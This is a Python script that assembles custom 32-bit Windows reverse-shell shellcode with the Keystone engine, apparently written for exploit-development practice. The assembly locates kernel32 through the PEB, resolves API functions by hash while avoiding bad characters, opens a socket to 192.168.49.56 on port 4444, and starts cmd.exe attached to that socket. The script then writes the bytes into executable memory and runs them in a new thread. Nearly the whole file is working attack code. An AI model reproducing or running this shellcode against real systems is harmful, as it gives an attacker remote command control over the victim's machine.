#!/usr/bin/python3

import ctypes, struct
from keystone import *

CODE = (
    " start:                             "  #
    #"   int3                            ;"  #   Breakpoint for Windbg. REMOVE ME WHEN NOT DEBUGGING!!!!
    "   mov   ebp, esp                  ;"  #
    "   add   esp, 0xfffff9f0           ;"  #

    " find_kernel32:                     "  #
    "   xor   ecx, ecx                  ;"  #   ECX = 0
    "   mov   esi,fs:[ecx+30h]          ;"  #   ESI = &(PEB) ([FS:0x30])
    "   mov   esi,[esi+0Ch]             ;"  #   ESI = PEB->Ldr
    "   mov   esi,[esi+1Ch]             ;"  #   ESI = PEB->Ldr.InInitOrder
    
    " next_module:                      "   #
    "   mov   ecx, [esi+8h]             ;"  # avoiding bad char
    "   mov   ebx, ecx                  ;"
    "   xor   ecx, ecx                  ;"  #   ECX = 0    
    "   mov   edi, esi                  ;"
    "   add   edi, 0x1f               	;"
    "   inc   edi                     	;"
    "   mov   edi, [edi]                ;"
    "   mov   esi, [esi]                ;"  #   ESI = InInitOrder[X].flink (next)
    "   cmp   [edi+12*2], cx            ;"  #   (unicode) modulename[12] == 0x00 ?
    "   jne   next_module               ;"  #   No: try next module.

    "   find_function_jmp:              "
    "   jmp callback                    ;"

    "   find_function_ret:              "
    "   pop 	edi                     ;"
    "   mov 	esi, edi                ;"
    "   mov 	dword ptr[ebp+0x4], esi ;"
    "   jmp 	resolve_k32_sym         ;"

    "   callback:                       "
    "   call find_function_ret          ;"

    "   find_function:                  "
    "   add 	esp, 0x4                ;"
    "   pop 	eax                     ;"
    "   push 	-0x1                    ;"
    "   add 	esp, eax                ;"

    "   find_function_loop2:            "
    "   mov 	eax, [ebx+0x3c]         ;"
    "   mov 	edi, [ebx+eax+0x78]     ;"
    "   add 	edi, ebx                ;"
    "   mov 	ecx, [edi+0x18]         ;"
    "   mov 	esi, edi                ;"
    "   add 	esi, 0x1f               ;"
    "   inc 	esi                     ;"
    "   mov 	eax, [esi]              ;"
    "   add 	eax, ebx                ;"
    "   mov 	[ebp-0x4], eax          ;"

    "   find_function_loop:             "
    "   add ecx, -0x1                   ;"
    "   mov eax, [ebp-0x4]              ;"
    "   mov esi, [eax+ecx*4]            ;"
    "   add esi, ebx                    ;"

    "   compute_hash:                   "
    "   xor eax, eax                    ;"
    "   cdq                             ;"

    "   compute_hash_repeat:            "
    "   ror edx, 0xc                    ;"
    "   ror edx, 0x1                    ;"  # to avoid badchar of 0xd
    "   add edx, eax                    ;"
    "   lodsb                           ;"
    "   test al, al                     ;"
    "   jnz compute_hash_repeat         ;"

    "   find_function_compare:          "
    "   cmp edx, [esp-0x4]              ;"
    "   jnz find_function_loop          ;"
    "   mov edx, [edi+0x24]             ;"
    "   add edx, ebx                    ;"
    "   mov cx, [edx+2*ecx]             ;"
    "   mov edx, [edi+0x1c]             ;"
    "   add edx, ebx                    ;"
    "   mov eax, [edx+4*ecx]            ;"
    "   add eax, ebx                    ;"
    "   push eax                        ;"
    "   cmp dword ptr [esp-0x4], -0x1   ;"
    "   jnz find_function_loop2         ;"

    "   find_function_finish:           "
    "   sub esp, 0x8                    ;"
    "   ret                             ;"
    
    "   resolve_k32_sym:                "
    "   push 0xec0e4e8e                 ;"  # loadlibraryA
    "   push 0x16b3fe72                 ;"  # CreateproccessA
    "   push 0xc                     	;"
    "   call [ebp+0x4]                  ;"

    "   load_ws2_32:                    "
    "   xor eax, eax                    ;"
    "   mov ax, 0x6c6c                  ;" # ll
    "   push eax                        ;"
    "   push 0x642e3233                 ;" # d.23
    "   push 0x5f327377                 ;" # _2sw
    "   push esp                        ;" # ptr to ws_32 string
    "   call [esp+0x18]                 ;"

    "   resolve_ws2_sym:                "
    "   mov ebx, eax                    ;" # ws_32 base addr
    "   push 0x60aaf9ec                 ;" # connect
    "   push 0xadf509d9                 ;" # WSASocketA
    "   push 0xc                        ;"
    "   call [ebp+0x4]                  ;"

    "   call_wsasocketa:                "
    "   xor eax, eax                    ;"
    "   push eax                        ;"
    "   push eax                        ;"
    "   push eax                        ;"
    "   push 0x6                        ;"
    "   push 0x1                        ;"
    "   push 0x2                        ;"
    "   call [esp+0x1c]                 ;"

    "   call_connect:                    "
    "   mov ebx, eax                    ;"
    "   xor edi, edi                    ;"
    "   xor eax, eax                    ;"
    "   push edi                        ;"
    "   push edi                        ;"
    "   push 0x3831a8c0                 ;" # 192.168.49.56
    "   mov di, 0x5c11                  ;" # 4444
    "   shl edi, 0x10                   ;"
    "   add di, 0x2                     ;" # AF_NET
    "   push edi                        ;"
    "   mov edi, esp                    ;"
    "   push 0x10                       ;"
    "   push edi                        ;" # name
    "   push ebx                        ;" # SOCKFD
    "   call [esp+0x24]                 ;"

    "   create_startupinfo:             "
    "   xor ecx, ecx                    ;"
    "   mov esi, esp                    ;"
    "   std                             ;"
    "   mov cl, 0x22                    ;"  
    "   inc cl                          ;"
    "   rep stosd                       ;"
    "   cld                             ;"
    "   push ebx                        ;"
    "   push ebx                        ;"
    "   push ebx                        ;"
    "   push eax                        ;"
    "   push eax                        ;"
    "   inc ch                          ;"
    "   push ecx                        ;"
    "   dec ch                          ;"
    "   sub esp, 0x28                   ;"
    "   mov al, 0x44                    ;"
    "   push eax                        ;"
    "   mov edi, esp                    ;"

    " create_cmd_str:	                 "
    "   mov eax, 0xff9a879b             ;" # exe
    "   neg eax                         ;"
    "   push eax                        ;"
    "   push 0x2e646d63                 ;" # cmd.
    "   mov ebx, esp                    ;"
    "   call_createprocessa:             "
    "   mov eax, ebx                    ;"
    "   add eax, 0xfffffc70             ;"
    "   push eax                        ;" # lpProcessInfo
    "   push edi                        ;" # lpStartupInfo
    "   sub esp, 0xc                    ;"
    "   push 0x1                        ;"
    "   push ecx                        ;"
    "   push ecx                        ;"
    "   push ebx                        ;"
    "   push ecx                        ;"
    "   lea edx, [esp+0x54]             ;"
    "   call [edx+0x4c]                 ;"
)




# Initialize engine in x86-32bit mode
ks = Ks(KS_ARCH_X86, KS_MODE_32)

encoding, count = ks.asm(CODE)
print("Encoded %d instructions..." % count)

sh = b""
for e in encoding:
	sh += struct.pack("B", e)
shellcode = bytearray(sh)

final = ""

final += 'shellcode = b"'

for enc in encoding:
    final += "\\x{0:02x}".format(enc)

final += '"'

ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
	ctypes.c_int(len(shellcode)),
	ctypes.c_int(0x3000),
	ctypes.c_int(0x40))
																					
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
	buf,
	ctypes.c_int(len(shellcode)))

print(final)
print("Shellcode located at address %s" % hex(ptr))
input("...ENTER TO EXECUTE SHELLCODE...")

ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
	ctypes.c_int(0),
	ctypes.c_int(ptr),
	ctypes.c_int(0),
	ctypes.c_int(0),
	ctypes.pointer(ctypes.c_int(0)))
																				 
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
